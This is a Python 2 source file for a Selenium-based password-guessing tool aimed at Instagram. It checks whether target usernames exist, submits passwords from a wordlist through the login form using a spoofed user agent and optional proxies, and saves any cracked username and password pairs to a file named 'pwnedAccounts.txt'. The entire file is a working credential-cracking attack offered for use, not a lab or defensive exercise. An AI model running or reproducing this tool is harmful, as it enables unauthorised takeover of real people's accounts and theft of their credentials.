#!/bin/python
from mainLib import *
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import simplejson as json
import sys
import optparse
import yaml

profile = webdriver.FirefoxProfile()
profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
driver = "reserved"

def userExists(username):
	try:
		driver.get("https://instagram.com/"+username)
		assert (("Page Not Found" or "no encontrada") not in driver.title)
	except AssertionError:
		print 'user: "%s" does not exist, trying with the next!' %username
		return 1
	except:
		'uknown error'

def login(user, password, delay):
	try:
		print 'Trying with password: ' + password
		elem = driver.find_element_by_name("username")
		elem.clear()
		elem.send_keys(user)
		elem = driver.find_element_by_name("password")
		elem.clear()
		elem.send_keys(password)
		elem.send_keys(Keys.RETURN)
		sleep(delay)
		assert (("Login") in driver.title)
		#assert (("Your username or password was incorrect" or "son incorrectos.") not in driver.page_source)
		#if driver.current_url == 'https://www.instagram.com/':
		#	print 'Password correct!'
		#	print '%s' %password
		#else:
		#	print 'Wrong password'
	except AssertionError:
		print 'Access granted mother kaker!!'
		print 'The password is: ' + password
		try:
			f = open('pwnedAccounts.txt','a')
		except:
			f = open('pwnedAccounts.txt','w')
		f.write('username:'+user+'\npassword:'+password+'\n')
		f.close()
		driver.delete_all_cookies()
		return 1
	except:
		print "\r Check your connection to the internet mother kaker\r"

def dictionaryAttack(usernames,passwords,delay):
	if str(type(usernames)) == "<type 'list'>":
		for username in usernames:
			if (userExists(username) == 1):
				continue
			driver.get("https://instagram.com/accounts/login/")
			sleep(delay * 7)
			print 'Trying with username: ' + username
			for password in passwords:
				if (login(username,password,delay) == 1):
					cj.clear()
					break
	else:
		if (userExists(usernames) == 1):
			return
		driver.get("https://instagram.com/accounts/login/")
		sleep(delay * 7)
		print 'Trying with username: ' + usernames
		for password in passwords:
			if (login(usernames,password,delay) == 1):
				break
def main():
	parser = optparse.OptionParser()
	parser.add_option('-f', '--file', action="store", dest="userfile", help="File containing valid usernames (one per line)", default=False)
	parser.add_option('-d', '--dictionary', action="store", dest="dictionary", help="File containing passwords", default=False)
	parser.add_option('-u', '--username', action="store", dest="username", help="A valid username", default=False)
	parser.add_option('-t', '--time', action="store", dest="delay", help="delay in seconds. Use this option based on your connection speed", default=True)
        parser.add_option('-p', '--proxy', action='store_true', default=False)
	options, args = parser.parse_args()

	global driver

	if (options.delay is None):
		delay = 2
	else:
		delay = int(options.delay)
	print 'Using %d seconds of delay' %delay

	if ( (options.userfile == False) and (options.username == False) ) :
		print 'You have to set an username or a userfile'
		exit()
	if ( (options.userfile != False) and (options.username != False) ) :
		print 'You can\'t set both options at once.. choose between username or userfile'
		exit()
	if (options.dictionary == False):
		print 'You have to set a valid path for the passwords dictionary'
		exit()
        if options.proxy:
            with open('proxy.yaml', 'r') as f:
                # TODO For now it just takes the first proxy config
                config = yaml.load(f).values()[0]
                for k, v in config.iteritems():
                    getattr(profile, 'set_preference')(k,v)
                profile.update_preferences()


	try:
		f = open(options.dictionary,'r')
		passwords = []

		while True:
			line = f.readline()
			if not line:
				break
			passwords.append(line.strip('\n'))
		f.close()
	except:
		print 'Check the path to the dictionary and try again'
		exit()

	if (options.userfile != False):
		try:
			f = open(options.userfile,'r')
			usernames = []

			while True:
				line = f.readline()
				if not line:
					break
				usernames.append(line.strip('\n'))
			f.close()
		except:
			print 'Check the path to the users file and try again'
			exit()

        	driver = webdriver.Firefox(profile)
        	driver.implicitly_wait(30)
		dictionaryAttack(usernames,passwords,delay)
	else:
       		driver = webdriver.Firefox(profile)
	        driver.implicitly_wait(30)
		dictionaryAttack(options.username,passwords,delay)

	driver.close()
if __name__ == '__main__':
	main()
